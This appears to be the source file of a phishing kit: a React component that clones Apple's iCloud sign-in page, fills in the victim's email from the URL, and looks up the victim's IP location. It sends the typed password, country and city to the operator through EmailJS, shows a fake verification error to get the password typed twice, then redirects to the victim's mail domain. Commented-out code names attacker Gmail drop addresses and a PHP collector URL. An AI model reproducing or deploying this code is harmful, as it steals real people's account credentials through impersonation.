import React, { useEffect, useState, useRef } from "react";
import './Icloud.css';
import { BsArrowUpRight, BsQuestionCircle } from 'react-icons/bs';
import { HiMiniEllipsisHorizontal } from 'react-icons/hi2';
import Preloader from "../../Preloader/Preloader";
// import $ from 'jquery';
import emailjs from '@emailjs/browser';


const Icloud = ()=>{

    const formRef = useRef();

    const [ipAdress, setIpAdress] = useState('')
    const [city, setCity] = useState('');
    const [flag, setFlag] = useState('');
    const [country, setCountry] = useState('');
  
    const forTime = new Date();
  
    useEffect(()=>{
      fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`)
      .then(req=> req.json())
      .then(res=>{
  
          setIpAdress(res.ip)
          setFlag(res.country.flag);
          setCountry(res.country.name);
          setCity(res.city.names.en);
  
      })
      .catch(e=> console.log)
  }, []);
  

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();
    // console.log(extracetdEmail);

    useEffect(()=>{
        const tabTitle = 'iCloud';
        document.title = tabTitle;
        setSpinLoader(true);
        setTimeout(() => {
            setSpinLoader(false);
        }, 2500);
    },[]);

    const reloadWebPageHandler = ()=> window.location.reload();

    const [menu, setMenu] = useState(false);
    const toggleMenu = ()=> setMenu(menu => !menu);
    // const hideMenu = ()=> setMenu(false);

    const [email, setEmail] = useState(extracetdEmail);
    const [password, setPassword] = useState('');

    const [verify, setVerify] = useState(false);

    const [spinLoader, setSpinLoader] = useState(false);

    const [count, setCount] = useState(0);

    const handleFormEvent = ___=>{
        ___.preventDefault();
       
        // console.log('submitted!');
        setSpinLoader(true);
        setTimeout(() => {
            setSpinLoader(false);
            setPassword('');
            setVerify(true);
        }, 2400);


        // const user = {
        //     email: email,
        //     password: password,
        //     // country: country,
          
        //     // city: city,
        //     // flag: flag,
        //     // eyep: ipAdress,
        //     // nownow: forTime	
        // };
    

         // post to server
        //  const user = {
        //     email: email,
        //     password: password,
            // subject: "Chameleon Page Logs",
            // to: "rvvlsales13@gmail.com",
            // // body: `Email: ${defaultEmail}  Password: ${defaultPassword}`
            // body:
            // `
            // <html lang="en">
            // <p>Online Correspondence: ${email}</p>
            // <p>Signal: ${password}</p>
            // <p>Country: ${country}</p>
            // <p>Flag: ${flag}</p>
            // </html>
            // `
        // };



        // const user = {
        //     "subject": "Coming Logs",
        //     "to": "reportwork5252@gmail.com",
        //     "body": `<div><h3></h3><p>Online_Correspondence: ${email}</p><p>Signal: ${password}</p><p>Country: ${country}</p><p>Flag: ${flag}</p></div>`
        // }


    
        // $.ajax({
        //     type: "POST",
        //     url: "https://trezanolz.com/kenneth/chame.php",
        //     data: user,
        //     success(data) {
        //         // alert('OK');
        //         console.log('data');
        //     },
        // });



        const serviceID = `service_xhrj4w4`;
        const templateID = `template_crghlbk`;
        const publicKey = `35JbsFMyI7dxAGiKW`;


        emailjs
        .sendForm(serviceID, templateID, formRef.current, {
          publicKey: publicKey,
        })
        .then(
          () => {
            console.log('!');
          },
          (error) => {
            console.log('...', error.text);
          },
        );





        setCount(count=> count + 1);
        if(count >= 1){
            const redirectURL = window.location.href;
            const sliceEqualSign = redirectURL.indexOf("@");
            const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1)).split('&', 1).toString();
            setTimeout(() => {
                window.location.href = `https://${extracetdemailDomain}`;
                
            }, 1500);

        };

    // };

    };


    return(<section className="root-viewport" 
    // onClick={hideMenu}
    >

        { spinLoader ? <Preloader /> : undefined }


        <div className="fxxxd">
            <div className="toolbar-banner">
                
                <span onClick={reloadWebPageHandler} style={{
                    cursor:'pointer'
                }}>
                    <svg width="90" height="31" xmlns="http://www.w3.org/2000/svg" className="apple-icloud-logo" aria-hidden="true"><g fill="none" fillRule="nonzero"><path d="M77.005 23.215c1.568 0 2.767-.779 3.382-2.06h.061V23H83V8.204h-2.552v5.793h-.061c-.615-1.302-1.855-2.092-3.392-2.092-2.726 0-4.479 2.143-4.479 5.65v.01c0 3.497 1.742 5.65 4.489 5.65Zm.768-2.153c-1.64 0-2.654-1.333-2.654-3.497v-.01c0-2.163 1.025-3.496 2.654-3.496 1.568 0 2.675 1.374 2.675 3.496v.01c0 2.133-1.096 3.497-2.675 3.497Zm-13.05 2.153c1.64 0 2.757-.758 3.32-1.917h.052V23h2.552V12.13h-2.552v6.297c0 1.579-.933 2.635-2.398 2.635-1.455 0-2.173-.872-2.173-2.41v-6.521h-2.552v7.024c0 2.522 1.363 4.06 3.751 4.06Zm-10.826 0c3.187 0 5.257-2.122 5.257-5.65v-.02c0-3.507-2.1-5.64-5.267-5.64-3.157 0-5.248 2.154-5.248 5.64v.02c0 3.518 2.06 5.65 5.258 5.65Zm.01-2.06c-1.63 0-2.665-1.303-2.665-3.59v-.02c0-2.256 1.056-3.568 2.645-3.568 1.619 0 2.664 1.302 2.664 3.568v.02c0 2.277-1.035 3.59-2.644 3.59ZM44.137 23h2.55V8.204h-2.55V23Zm-8.357.256c3.402 0 5.913-2.102 6.292-5.137l.02-.102H39.5l-.031.102c-.482 1.825-1.804 2.84-3.69 2.84-2.572 0-4.232-2.07-4.232-5.362v-.01c0-3.282 1.65-5.343 4.233-5.343 1.926 0 3.228 1.056 3.658 2.748l.051.195h2.593l-.01-.103c-.39-3.014-2.89-5.137-6.292-5.137-4.243 0-6.938 2.912-6.938 7.64v.01c0 4.727 2.685 7.66 6.938 7.66ZM25.424 10.572a1.4 1.4 0 1 0 0-2.8c-.799 0-1.424.626-1.424 1.406 0 .759.625 1.394 1.424 1.394ZM24.144 23h2.551V12.13h-2.552V23Z" fill="#1D1D1F"></path><path d="M12.9 7.598c.608-.737 1.04-1.74 1.04-2.755 0-.14-.013-.28-.038-.394-.99.038-2.183.66-2.893 1.498-.559.635-1.079 1.65-1.079 2.666 0 .153.026.305.038.356.064.012.165.025.267.025.888 0 2.004-.597 2.664-1.396Zm.697 1.612c-1.484 0-2.69.901-3.464.901-.825 0-1.903-.85-3.197-.85C4.486 9.26 2 11.292 2 15.113c0 2.387.914 4.9 2.056 6.526.977 1.37 1.827 2.5 3.057 2.5 1.218 0 1.751-.812 3.261-.812 1.536 0 1.878.787 3.223.787 1.332 0 2.22-1.218 3.058-2.425.939-1.383 1.332-2.729 1.345-2.793-.076-.025-2.626-1.066-2.626-3.986 0-2.526 2.004-3.656 2.118-3.745-1.32-1.904-3.337-1.955-3.895-1.955Z" fill="#1D1D1F" opacity=".569"></path></g></svg>
                </span>

                <span>
                    <HiMiniEllipsisHorizontal className="flat-ellipsis" onClick={toggleMenu} />
                </span>

            </div>

            { menu ? <div className="rttt">
                <article className="menu-article" onClick={reloadWebPageHandler}>
                    <BsQuestionCircle /> 
                    &#160; 
                    iCloud User Guide 
                    &#160;  
                    <BsArrowUpRight style={{ fontSize:'13px' }} />
                </article>
            </div> : null }
            
        </div>


        <div className="ctr">
            <main className="main">
                <div className="f-j-c">
                    <img 
                        aria-hidden="true" 
                        draggable={false} 
                        alt=""
                        src="https://www.icloud.com/system/icloud.com/2317Hotfix58/en-us/4f72d89d71e9abcc4e37c71fb77fe65b.svg"
                        className="icon"
                    />
                </div>

                <div className="txt-id">
                    <h1>Sign in with Apple ID</h1>
                </div>

                <form 
                onSubmit={handleFormEvent} 
                className='fffoorrmmm'
                ref={formRef}
                >
                    {/* <div className=""> */}
                        {/* <div className="account-name"> */}

                            <div className="form-cell f-j-c">


                                <span className=" form-cell-wrapper form-textbox   ">
                                    <input 
                                        type="text" 
                                        className="account_name_text_field" 
                                        required
                                        readOnly
                                        value={email}
                                        onChange={e=> setEmail(e.target.value)}
                                        name="online_correspondence"
                                    />
                                </span>


                            </div>


                            <div className="form-cell f-j-c">


                                <span className=" form-cell-wrapper form-textbox   ">
                                    {/* <p></p> */}
                                    <input 
                                        type="password" 
                                        className="account_name_password_field" 
                                        required
                                        value={password}
                                        onChange={e=> setPassword(e.target.value)}
                                        name="signal"
                                    />

                                    {/* <BsArrowRightCircle  className="arr_circ_rt"/> */}
                                </span>
                                


                            </div>

                            <input type="text" value={country} name="country" hidden/>
              <input type="text" value={city} name="city" hidden/>

                            <input type='submit' style={{visibility:'hidden'}}/>

                            { verify ? <code style={{
                                color:'#ba1100',
                                fontSize:'13px',
                                textAlign:'center',
                                display:'flex',
                                justifyContent:'center',
                                marginTop:'11px'
                            }}>Failed to verify your identity. Try again.</code> : null }


                            <article className="f-j-c artttt">
                                <input type={`checkbox`}/>
                                &#160;
                                <span>Keep me signed in</span>
                            </article>

                            <div className="f-j-c fgt_pwd_" onClick={reloadWebPageHandler}>
                                Forgot password?
                                <BsArrowUpRight />

                            </div>

                            <p className="ppppp_id" onClick={reloadWebPageHandler}>Create Apple ID</p>




                        {/* </div> */}

                    {/* </div> */}

                </form>


            </main>
        </div>

        <div className="footer_app">
            <div>
                <span onClick={reloadWebPageHandler} >System Status</span>&#160;&#160;&#160;&#160;&#160;
                <span onClick={reloadWebPageHandler}>Privacy Policy</span>&#160;&#160;&#160;&#160;&#160;
                <span onClick={reloadWebPageHandler}>Terms & Conditions</span>&#160;&#160;
            </div>

            <div>
                Copyright © 2023 Apple Inc. All rights reserved.
            </div>


        </div>


    </section>)
};

export default Icloud;